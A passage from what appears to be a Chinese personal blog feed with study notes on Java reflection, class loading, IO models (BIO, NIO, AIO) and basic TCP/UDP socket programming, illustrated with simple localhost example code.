class="line-numbers language-Java"><code class="language-Java">// 获取所有字段 getDeclaredFieldsArrays.asList(Apple.class.getDeclaredFields()).forEach(f->System.out.println(f.getName()));// 获取单个字段Apple.class.getDeclaredField("area").getName();<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="修改字段值"><a href="#修改字段值" class="headerlink" title="修改字段值"></a>修改字段值</h5><pre class="line-numbers language-Java"><code class="language-Java">Apple apple = new Apple();apple.setArea("深圳");// 获取area字段Field field = Apple.class.getDeclaredField("area");    ***      // private字段，需要强制    ***      field.setAccessible(true);// 将值修改成长沙field.set(apple, "长沙");System.out.println(apple.getArea());  //长沙<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="通过反射创建类对象"><a href="#通过反射创建类对象" class="headerlink" title="通过反射创建类对象"></a>通过反射创建类对象</h5><p>通过反射创建类对象主要有两种方式：通过 Class 对象的 newInstance() 方法、通过 Constructor 对象的 newInstance() 方法。</p><p><strong>第一种：通过 Class 对象的 newInstance() 方法。</strong></p><pre class="line-numbers language-Java"><code class="language-Java">Class clz = Apple.class;Apple apple = (Apple)clz.newInstance();<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>第二种：通过 Constructor 对象的 newInstance() 方法</strong></p><pre class="line-numbers language-Java"><code class="language-Java">Class clz = Apple.class;Constructor constructor = clz.getConstructor(String.class, int.class);Apple apple = (Apple)constructor.newInstance("红富士", 15);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>通过 Constructor 对象创建类对象可以选择特定构造方法，而通过 Class 对象则只能使用默认的无参数构造方法。</p><h5 id="获取方法"><a href="#获取方法" class="headerlink" title="获取方法"></a>获取方法</h5><p>我们通过 Class 对象的 getFields() 方法可以获取 Class 类的属性，但无法获取私有属性。</p><pre class="line-numbers language-Java"><code class="language-Java">Class clz = Apple.class;Field[] fields = clz.getFields();for (Field field : fields) &#123;    System.out.println(field.getName());&#125;输出：price<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>而如果使用 Class 对象的 getDeclaredFields() 方法则可以获取包括私有属性在内的所有属性：</p><pre class="line-numbers language-Java"><code class="language-Java">Class clz = Apple.class;Field[] fields = clz.getDeclaredFields();for (Field field : fields) &#123;    System.out.println(field.getName());&#125;输出：nameprice<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>与获取类属性一样，当我们去获取类方法、类构造器时，如果要获取私有方法或私有构造器，则必须使用有 declared 关键字的方法。</p><h5 id="执行方法"><a href="#执行方法" class="headerlink" title="执行方法"></a>执行方法</h5><pre class="line-numbers language-Java"><code class="language-Java">Apple apple = new Apple();apple.setArea("深圳");// 获取setArea 方法Method m = Apple.class.getDeclaredMethod("setArea", String.class);// 调用apple对象的 setAream.invoke(apple, "长沙");System.out.println(apple.getArea()); // 输出长沙<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="获取继承的类，接口"><a href="#获取继承的类，接口" class="headerlink" title="获取继承的类，接口"></a>获取继承的类，接口</h5><pre class="line-numbers language-Java"><code class="language-Java">// 获取 继承的类Apple.class.getSuperclass()// 获取实现的接口Apple.class.getInterfaces()注意如果是几代继承就获取不到。比如A 实现B ，B实现C 。 获取A的getInterfaces就只能返回B ，而不返回C 。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="示例–反射实现SPI机制"><a href="#示例–反射实现SPI机制" class="headerlink" title="示例–反射实现SPI机制"></a>示例–反射实现SPI机制</h3><p><strong>通过改配置文件，来实现不同功能的切换。</strong></p><h5 id="定义两种功能（RedisCache和MemeCache）"><a href="#定义两种功能（RedisCache和MemeCache）" class="headerlink" title="定义两种功能（RedisCache和MemeCache）"></a>定义两种功能（RedisCache和MemeCache）</h5><pre class="line-numbers language-Java"><code class="language-Java">//缓存接口public interface Cache &#123;    // 设置缓存    void set(String key , String value);    //获取缓存    String get(String key);&#125;//redis 提供的缓存实现public class RedisCache implements Cache&#123;    @Override    public void set(String key, String value) &#123;        System.out.println("[redis缓存] set");    &#125;    @Override    public String get(String key) &#123;        System.out.println("[redis缓存] get");        return "";    &#125;&#125;//MemeCache 提供的缓存实现public class MemeCache implements Cache&#123;    @Override    public void set(String key, String value) &#123;        System.out.println("[MemeCache缓存] set");    &#125;    @Override    public String get(String key) &#123;        System.out.println("[MemeCache缓存] get");        return "";    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="spring-factory配置文件"><a href="#spring-factory配置文件" class="headerlink" title="spring.factory配置文件"></a>spring.factory配置文件</h5><pre class="line-numbers language-factory"><code class="language-factory"># collection.RedisCache 是RedisCache类的全路径，代表项目要用redis缓存collection.RedisCache<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h5 id="ServiceLoader实现功能"><a href="#ServiceLoader实现功能" class="headerlink" title="ServiceLoader实现功能"></a>ServiceLoader实现功能</h5><pre class="line-numbers language-Java"><code class="language-Java">public class ServiceLoader &#123;    // 读取spring.factorys文件     private static Map<Class<?>, Class<?>> doFind() throws IOException &#123;        Path f = Paths.get(ServiceLoader.class.getResource("/").getPath().substring(1), "META-INF/spring.factorys");        List<String> strs = Files.readAllLines(f, Charset.forName("UTF-8"));        final Map<Class<?>, Class<?>> map = new HashMap<>();                // 把行内容变成 Map key： 接口 value:对应的实现类 ，再获取实现的接口        for (String line : strs) &#123;            try &#123;                Class<?> impl = Class.forName(line);                map.put(Class.forName(line).getInterfaces()[0], impl);            &#125; catch (Exception e) &#123;            &#125;        &#125;        return map;    &#125;        @SuppressWarnings("unchecked")    public static <T> T load(Class<T> inter) throws Exception &#123;            // 加载 spring.factorys文件        Map<Class<?>, Class<?>> mapper = doFind();                // 查找 对应的实现类        Class<T> impl = (Class<T>) mapper.get(inter);        if (impl == null) &#123;            return null;        &#125;                // 否则 利用反射生成 实现        return doCreate(impl);    &#125;        // 反射实例化对象    private static <T> T doCreate(Class<T> impl) throws InstantiationException, IllegalAccessException &#123;        return impl.newInstance();    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="代码逻辑"><a href="#代码逻辑" class="headerlink" title="代码逻辑"></a>代码逻辑</h5><ol><li>利用Paths加载${项目}/META-INF/spring.factorys文件，找到具体用哪个实现类。</li><li>将上述实现类forClass得到Class对象，并通过getInterfaces获取其实现的接口，封装成Map&lt;接口Class，实现类Class&gt;。</li><li>匹配load方法用户传过来的接口，通过上面map得到实现类，通过newInstance方法构造实例返回。</li></ol><h3 id="Java内存加载"><a href="#Java内存加载" class="headerlink" title="Java内存加载"></a>Java内存加载</h3><p><a href="https://smms.app/image/p5Yl7cxBDjRsor1" target="_blank"><img src="https://s2.loli.net/2023/12/20/p5Yl7cxBDjRsor1.jpg" ></a></p><p><a href="https://smms.app/image/7q1EmModVgfTpaH" target="_blank"><img src="https://s2.loli.net/2023/12/20/7q1EmModVgfTpaH.jpg" ></a></p><ol><li>类的加载 (Load) 类加载器完成将类的class文件读入内存并创建<code>java.lang.Class</code>对象操作。</li><li>类的链接 (Link) 将类的二进制数据合并进JRE，在合并的过程中可以对类进行校验，检查其是否存在安全问题，是否符合JVM语法规范，接着为类变量 (static) 分配内存和设置默认初始值，这些内存在方法区中进行分配。最后在虚拟机,中将常量名替换为引用地址。</li><li>类的初始化 (lnitialize) JVM对类进行初始化，过程中执行类构造器的方法，此方法是编译期自动收集类中的变量赋值动作和静态代码合并而成的，目标虚拟机会保证类构造器的方法会在多线程中被正确的加锁和同步。且在初始化过程中，如果发现类的父类还没有被初始化，则会优先初始化其父类。</li></ol><p><strong>类缓存：</strong>标准的JavaSE类加载器可以按要求查找类，但一旦某个类被加载到加载器中将维持加载（缓存）一段时间，不过JVM垃圾回收机制可以回收这些Class对象</p><h2 id="Java反射安全"><a href="#Java反射安全" class="headerlink" title="Java反射安全"></a>Java反射安全</h2><h3 id="反射带来的安全问题"><a href="#反射带来的安全问题" class="headerlink" title="反射带来的安全问题"></a>反射带来的安全问题</h3><ol><li>性能低-因为java反射动态地解析类型，它涉及处理像扫描类路径找到要加载的类，导致性能降低。 </li><li>安全限制-反射需要运行时权限，可能不适用于在安全管理器下运行的系统。这可能会导致应用程序在运行时由于安全管理器而失败。 </li><li>安全问题-使用反射，我们可以访问我们不应该访问的部分代码，例如，我们可以访问类的私有字段并更改它的值。这可能是一个严重的安全威胁，并导致您的应用程序的行为异常。 </li><li>高维护-反射代码很难理解和调试，在编译时也无法找到代码的任何问题，因为类可能不可用，使得它不太灵活和难以维护。</li></ol><h3 id="安全问题原理"><a href="#安全问题原理" class="headerlink" title="安全问题原理"></a>安全问题原理</h3><p>每个类都有且仅有一个class对象。通过类和对象都能获取到类的class对象，获取到class对象有下面三种方式。</p><pre><code>1.Student.class   //通过类名.class的方式获取class对象2.stu1.getClass()   //通过类对象.getClass()的方式获取class对象3.Class.forName(&quot;com.test.Student&quot;)  //通过全限定名的方式获取class对象</code></pre><p>Java反射的主要作用是通过class对象来对类的属性和方法进行获取和调用，但是还有一个极为重要的特征就是可以调用类的私有方法（包括protected和private）。这种的特性是后续很多java反序列化利用链依赖反射机制的重要原因。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;注解&quot;&gt;&lt;a href=&quot;#注解&quot; class=&quot;headerlink&quot; title=&quot;注解&quot;&gt;&lt;/a&gt;注解&lt;/h2&gt;&lt;h3 id=&quot;Java注解概述&quot;&gt;&lt;a href=&quot;#Java注解概述&quot; class=&quot;headerlink&quot; title=&quot;Java注解概述&quot;</summary>
      
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>Java IO</title>
    <link href="https://liu1272.github.io/2023/12/15/Java-IO/"/>
    <id>https://liu1272.github.io/2023/12/15/Java-IO/</id>
    <published>2023-12-14T17:48:00.000Z</published>
    <updated>2023-12-20T18:24:16.403Z</updated>
    
    <content type="html"><![CDATA[<h4 id="Java-IO一览表"><a href="#Java-IO一览表" class="headerlink" title="Java IO一览表"></a>Java IO一览表</h4><p><a href="https://smms.app/image/lxEK1eG4MWaQvqS" target="_blank"><img src="https://s2.loli.net/2023/12/15/lxEK1eG4MWaQvqS.png" ></a></p><h2 id="同步-异步-阻塞-非阻塞"><a href="#同步-异步-阻塞-非阻塞" class="headerlink" title="同步|异步|阻塞|非阻塞"></a>同步|异步|阻塞|非阻塞</h2><h4 id="同步"><a href="#同步" class="headerlink" title="同步"></a>同步</h4><p>  指的是协同步调。既然叫协同，所以至少要有2个以上的事物存在。协同的结果就是：多个事物不能同时进行，必须一个一个的来，上一个事物结束后，下一个事物才开始。</p><h4 id="异步"><a href="#异步" class="headerlink" title="异步"></a>异步</h4><p>  就是步调各异。既然是各异，那就是都不相同。所以结果就是：多个事物可以你进行你的、我进行我的，谁都不用管谁，所有的事物都在同时进行中。</p><h4 id="阻塞"><a href="#阻塞" class="headerlink" title="阻塞"></a>阻塞</h4><p>  所谓阻塞：指的是阻碍堵塞。它的本意可以理解为由于遇到了障碍而造成的动弹不得。</p><h4 id="非阻塞"><a href="#非阻塞" class="headerlink" title="非阻塞"></a>非阻塞</h4><p>  所谓非阻塞：自然是和阻塞相对，可以理解为由于没有遇到障碍而继续畅通无阻。</p><h2 id="BIO"><a href="#BIO" class="headerlink" title="BIO"></a>BIO</h2><p><strong>同步并阻塞</strong>，服务器实现模式为一个连接一个线程<br>  如果这个连接不做任何事情会造成不必要的线程开销，当然可以通过线程池机制改善。<br>  BIO方式适用于连接数目比较小且固定的架构，这种方式对服务器资源要求比较高，并发局限于应用中。<br><a href="https://smms.app/image/LnWFysMRue63GE2" target="_blank"><img src="https://s2.loli.net/2023/12/15/LnWFysMRue63GE2.jpg" ></a></p><h4 id="服务端："><a href="#服务端：" class="headerlink" title="服务端："></a>服务端：</h4><pre class="line-numbers language-Java"><code class="language-Java">public static void main(String args[]) throws IOException &#123;    //新建连接    ServerSocket serverSocket = new ServerSocket(30888);    System.out.println("Start accept...");    Socket socket = serverSocket.accept();        //缓冲区读入    BufferedReader reader = new BufferedReader(new InputStreamReader(socket.getInputStream()));    PrintWriter writer = new PrintWriter(socket.getOutputStream());    writer.println("Connection Success!");    writer.flush();        //关闭读取    reader.close();    writer.close();    socket.close();    serverSocket.close();&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="客户端："><a href="#客户端：" class="headerlink" title="客户端："></a>客户端：</h4><pre class="line-numbers language-Java"><code class="language-Java">public static void main(String args[]) throws IOException, UnknownHostException &#123;    //新建连接    Socket socket = new Socket(InetAddress.getLocalHost(), 30888);    PrintWriter writer = new PrintWriter(socket.getOutputStream());        //输入    Scanner scanner = new Scanner(System.in);    String readline = "";        //单方法使用lamda表达式    Thread thread = new Thread(() -> &#123;        int size = -1;        byte[] bytes = new byte[1024];        StringBuilder sb = new StringBuilder(1024);        try &#123;            //执行代码        &#125; catch (IOException e) &#123;            e.printStackTrace();        &#125;    &#125;);        //开启线程，关闭连接    thread.start();    scanner.close();    writer.close();    socket.close();    thread.interrupt();&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="伪异步IO"><a href="#伪异步IO" class="headerlink" title="伪异步IO"></a>伪异步IO</h2><p>  BIO模式的服务端是1:1的线程开销，访问量越大，系统将发生线程栈溢线程创建失败，最终导致进程宕机或者僵死，从而不能对外提供服务。<br>  伪异步IO的通信采用线程池和任务队列实现，当客户端接入时，将客户端的Socket封装成一个Task交给后端的线程池中进行处理。<br>  JDK的线程池维护一个消息队列和N个活跃的线程，对消息队列中Socket任务进行处理，由于线程池可以设置消息队列的大小和最大线程数，因此，它的资源占用是可控的，无论多少个客户端并发访问，都不会导致资源的耗尽和宕机。<br>  伪异步io采用了线程池实现，因此避免了为每个请求创建一个独立线程造成线程资源耗尽的问题，但由于底层依然是采用的同步阻塞模型，因此无法从根本上解决问题。<br>  如果单个消息处理的缓慢，或者服务器线程池中的全部线程都被阻塞，那么后续scket的io消息都将在队列中排排队。新的Socket请求将被拒绝，客户端会发生大量连接超时。<br><a href="https://smms.app/image/6MEzeTd9OHurkcY" target="_blank"><img src="https://s2.loli.net/2023/12/15/6MEzeTd9OHurkcY.jpg" ></a></p><h2 id="NIO"><a href="#NIO" class="headerlink" title="NIO"></a>NIO</h2><p><strong>同步非阻塞</strong>，服务器实现模式为一个请求一个线程<br>  多路复用器轮询到连接有I/O请求时才启动一个线程进行处理。<br>  NIO 新增了 Channel、Selector、Buffer 等抽象概念，支持面向缓冲、基于通道的 I/O 操作方法。<br>  NIO方式适用于连接数目多且连接比较短（轻操作）的架构，比如聊天服务器，并发局限于应用中。<br><a href="https://smms.app/image/f9czQpCtwxXGyae" target="_blank"><img src="https://s2.loli.net/2023/12/15/f9czQpCtwxXGyae.jpg" ></a></p><ul><li><strong>通道channel：</strong> 绑定一个缓存区，缓存区与磁盘文件的相互传输依靠 channel 双向通道。</li><li><strong>缓存区Buffer：</strong> Buffer 就像一个数组，可以保存多个相同类型的数据。BIO的Buffer只能单向，NIO可以双向。</li><li><strong>选择器Selector（多路复用器）：</strong> 将 Channel 注册之后可用于检查一个或多个 Channel 的状态是否处于连接就绪、接受就绪、可读就绪、可写就绪。</li></ul><h4 id="直接缓冲区与非直接缓冲区"><a href="#直接缓冲区与非直接缓冲区" class="headerlink" title="直接缓冲区与非直接缓冲区"></a>直接缓冲区与非直接缓冲区</h4><p><a href="https://smms.app/image/FQq3BDO7KityXRU" target="_blank"><img src="https://s2.loli.net/2023/12/15/FQq3BDO7KityXRU.jpg" ></a><br>  <strong>应用程序想从磁盘中读取一个数据时会向操作系统发起一个读请求，首先磁盘中的数据被读取到内核地址空间中，然后会把内核地址空间中的数据拷贝到用户地址空间中（其实就是 JVM 内存中），最后再把这个数据读取到应用程序中来。</strong></p><p><a href="https://smms.app/image/Wa9jEf7qu5UyOJt" target="_blank"><img src="https://s2.loli.net/2023/12/15/Wa9jEf7qu5UyOJt.jpg" ></a><br><strong>直接用物理内存作为缓冲区，读写数据直接通过物理内存进行。</strong></p><h4 id="分散读取与聚集写入"><a href="#分散读取与聚集写入" class="headerlink" title="分散读取与聚集写入"></a>分散读取与聚集写入</h4><p>  分散读取是指从 Channel 中读取的数据按照缓冲区的顺序 “分散” 到多个 Buffer 中<br>  聚集写入是指将多个 Buffer 中的数据按照缓冲区的顺序 “聚集” 到 Channel</p><pre class="line-numbers language-Java"><code class="language-Java">public static void test4() throws Exception &#123;    RandomAccessFile raf = new RandomAccessFile("a.txt", "rw");    // 获取通道    FileChannel channel = raf.getChannel();    // 分配指定大小缓冲区    ByteBuffer buf1 = ByteBuffer.allocate(2);    ByteBuffer buf2 = ByteBuffer.allocate(1024);    // 分散读取    ByteBuffer[] bufs = &#123;buf1, buf2&#125;;    channel.read(bufs);  // 参数需要一个数组    for (ByteBuffer byteBuffer : bufs) &#123;        byteBuffer.flip();  // 切换到读模式    &#125;    System.out.println(new String(bufs[0].array(), 0, bufs[0].limit()));  // 打印 he    System.out.println(new String(bufs[1].array(), 0, bufs[1].limit()));  // 打印 llo    // 聚集写入    RandomAccessFile raf2 = new RandomAccessFile("e.txt","rw");    // 获取通道    FileChannel channel2 = raf2.getChannel();    channel2.write(bufs);  // 把 bufs 里面的几个缓冲区聚集到 channel2 这个通道中，聚集到通道中，也就是到了 e.txt 文件中    channel2.close();&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h4><pre class="line-numbers language-Java"><code class="language-Java">public static void main(String[] args) throws  Exception&#123;        //创建ServerSocketChannel，-->> ServerSocket        ServerSocketChannel serverSocketChannel = ServerSocketChannel.open();        InetSocketAddress inetSocketAddress = new InetSocketAddress(5555);        serverSocketChannel.socket().bind(inetSocketAddress);                //设置成非阻塞        serverSocketChannel.configureBlocking(false);          //开启selector,并注册accept事件        Selector selector = Selector.open();        serverSocketChannel.register(selector, SelectionKey.OP_ACCEPT);                //循环接收请求        while(true) &#123;            selector.select(2000);  //监听所有通道            //遍历selectionKeys            Set<SelectionKey> selectionKeys = selector.selectedKeys();            Iterator<SelectionKey> iterator = selectionKeys.iterator();            while (iterator.hasNext()) &#123;                SelectionKey key = iterator.next();                                //处理连接事件                if(key.isAcceptable()) &#123;                      SocketChannel socketChannel = serverSocketChannel.accept();                                        //设置为非阻塞                    socketChannel.configureBlocking(false);                      System.out.println("client:" + socketChannel.getLocalAddress() + " is connect");                                        //注册客户端读取事件到selector                    socketChannel.register(selector, SelectionKey.OP_READ);                 &#125; else if (key.isReadable()) &#123;  //处理读取事件                    ByteBuffer byteBuffer = ByteBuffer.allocate(1024);                    SocketChannel channel = (SocketChannel) key.channel();                    channel.read(byteBuffer);                    System.out.println("client:" + channel.getLocalAddress() + " send " + new String(byteBuffer.array()));                &#125;                iterator.remove();  //事件处理完毕，要记得清除            &#125;        &#125;     &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h4><pre class="line-numbers language-Java"><code class="language-Java">public class NIOClient &#123;     public static void main(String[] args) throws Exception&#123;               SocketChannel socketChannel = SocketChannel.open();                                //设置成非阻塞            socketChannel.configureBlocking(false);            InetSocketAddress inetSocketAddress = new InetSocketAddress("127.0.0.1", 5555);             if(!socketChannel.connect(inetSocketAddress)) &#123;                while (!socketChannel.finishConnect()) &#123;                    System.out.println("客户端正在连接中，请耐心等待");                &#125;            &#125;             ByteBuffer byteBuffer = ByteBuffer.wrap("mikechen的互联网架构".getBytes());            socketChannel.write(byteBuffer);            socketChannel.close();    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="AIO"><a href="#AIO" class="headerlink" title="AIO"></a>AIO</h2><p><strong>异步非阻塞</strong>，服务器实现模式为一个有效请求一个线程</p><p>  Java AIO 采用订阅-通知模式：即应用程序向操作系统注册IO监听，然后继续做自己的事情。当操作系统发生IO事件，并且准备好数据后，在主动通知应用程序，触发相应的函数。</p><p>客户端的I/O请求都是由OS先完成了再通知服务器应用去启动线程进行处理。</p><p>  AIO方式使用于连接数目多且连接比较长（重操作）的架构，比如相册服务器，充分调用OS参与并发操作。</p><p><em><strong>IO模型是由操作系统提供支持的</strong></em></p><p>  windows系统提供了一种异步IO技术：<code>IOCP</code>（I/O CompletionPort，I/O完成端口）<br>  Linux下由于没有这种异步IO技术，所以使用 <code>epoll</code> 对异步IO进行模拟。</p><p>代码层面如下图所示结构。<br><a href="https://smms.app/image/r5iY9NuJVtgOBQx" target="_blank"><img src="https://s2.loli.net/2023/12/15/r5iY9NuJVtgOBQx.jpg" ></a></p><h2 id="三者比较"><a href="#三者比较" class="headerlink" title="三者比较"></a>三者比较</h2><p><a href="https://smms.app/image/YHS1Ixk3isQnJWa" target="_blank"><img src="https://s2.loli.net/2023/12/15/YHS1Ixk3isQnJWa.jpg" ></a></p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>  <strong>马上期末了，这两天把java剩下的反射和容器写完，然后——再鸽一段时间 hhh</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;Java-IO一览表&quot;&gt;&lt;a href=&quot;#Java-IO一览表&quot; class=&quot;headerlink&quot; title=&quot;Java IO一览表&quot;&gt;&lt;/a&gt;Java IO一览表&lt;/h4&gt;&lt;p&gt;&lt;a href=&quot;https://smms.app/image/lxEK1e</summary>
      
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>Java网络编程</title>
    <link href="https://liu1272.github.io/2023/12/14/Java%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/"/>
    <id>https://liu1272.github.io/2023/12/14/Java%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/</id>
    <published>2023-12-14T11:28:00.000Z</published>
    <updated>2023-12-20T18:24:35.121Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>  <strong>这篇文章我觉得我对于网络基础部分就不用再说更多了，直接一张图就够。剩下的用代码和注释来说明，看懂就是学会。</strong><br><a href="https://smms.app/image/Yv5mfec4P3sdFHt" target="_blank"><img src="https://s2.loli.net/2023/12/14/Yv5mfec4P3sdFHt.png" ></a></p><h2 id="单播通信"><a href="#单播通信" class="headerlink" title="单播通信"></a>单播通信</h2><h3 id="TCP通信"><a href="#TCP通信" class="headerlink" title="TCP通信"></a>TCP通信</h3><h4 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h4><pre class="line-numbers language-Java"><code class="language-Java">public class Sever &#123;    public static void main(String[] args) &#123;        ServerSocket serverSocket = null;   //初始化定义为空保证安全        Socket socket = null;        InputStream is = null;        ByteArrayOutputStream baos = null;        try &#123;            //创建ServerSocket对象，监听9999端口            serverSocket = new ServerSocket(9999);            //等待客户端的连接请求，返回一个Socket对象，程序阻塞在此处直到有客户端连接            socket = serverSocket.accept();            //获取输入流，用于读取客户端发送的数据            is = socket.getInputStream();            //创建字节数组输出流，用于存储读取到的数据            baos = new ByteArrayOutputStream();            //预定义缓冲区数组大小，方便存储数据            byte[] buffer = new byte[1024];            int len;            //循环读取客户端发送的数据，将数据存储到字节数组输出流中            while((len = is.read(buffer))!=-1)&#123;                //要写入的字节数组，从第一个元素开始写入，写入的字节数量                baos.write(buffer,0,len);              &#125;            //将字节数组输出流中的数据转换为字符串并输出到控制台            System.out.println(baos.toString());            //关闭字节数组输出流和输入流            baos.close();            is.close();            //关闭Socket对象和ServerSocket对象            socket.close();            serverSocket.close();        &#125; catch (IOException e)&#123;            e.printStackTrace(); //打印异常信息        &#125;    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h4><pre class="line-numbers language-Java"><code class="language-Java">public class Cilent &#123;    public static void main(String[] args) &#123;        Socket socket = null;   // 用于建立客户端与服务器之间的套接字连接        OutputStream os = null; // 用于向服务器发送数据的输出流        try &#123;                        // 通过IP地址获取服务器的InetAddress实例            InetAddress serverIP = InetAddress.getByName("127.0.0.1");             int port = 9999; // 连接服务器的端口号            // 创建套接字连接至服务器            socket = new Socket(serverIP, port);            // 通过套接字获取输出流，用于向服务器发送数据            os = socket.getOutputStream();            // 向服务器发送数据，需要            os.write("Hello, world!".getBytes());              //getBytes()方法编码为 byte 序列，并将结果存储到一个新的 byte 数组中        &#125; catch (IOException e) &#123;            e.printStackTrace();        &#125; finally &#123;            if (socket != null) &#123;                try &#123;                    socket.close(); // 关闭套接字连接                &#125; catch (IOException e) &#123;                    e.printStackTrace();                &#125;            &#125;        &#125;    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="UDP通信"><a href="#UDP通信" class="headerlink" title="UDP通信"></a>UDP通信</h3><h4 id="服务端-1"><a href="#服务端-1" class="headerlink" title="服务端"></a>服务端</h4><pre class="line-numbers language-Java"><code class="language-Java">public class Sever &#123;    public static void main(String[] args) throws Exception &#123;            //创建DatagramSocket对象，监听6666端口        DatagramSocket socket = new DatagramSocket(6666);                //一直循环接收信息        while (true) &#123;            byte[] container = new byte[1024];                        //创建DatagramPacket对象，用于接收客户端发送的数据（合成一个包）            DatagramPacket packet = new DatagramPacket(container,0,container.length);            //要发送或接收的数据的字节数组，从头开始读取或写入，读取或写入的字节数                        //接收客户端发送的数据            socket.receive(packet);            byte[] data = packet.getData();            //获取接收到的数据，返回一个字节数组                        //将接收到的字节数组（包）转换为字符串            String receiveDatas = new String(data,0,packet.getLength());            System.out.println(receiveDatas);                        //判断是否输入了“bye”，如果是则退出循环            if (receiveDatas.trim().equals("bye")) &#123;                break;            &#125;        &#125;                //关闭DatagramSocket对象        socket.close();    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="客户端-1"><a href="#客户端-1" class="headerlink" title="客户端"></a>客户端</h4><pre class="line-numbers language-Java"><code class="language-Java">public class Cilent &#123;    public static void main(String[] args) throws Exception &#123;        try &#123;                    //创建DatagramSocket对象，监听8888端口            DatagramSocket socket = new DatagramSocket(8888);                        //创建BufferedReader对象，用于从控制台读取数据            BufferedReader reader = new BufferedReader(new InputStreamReader(System.in));                                //一直循环接收信息            while (true) &#123;                            //从控制台读取数据                String data = reader.readLine();                     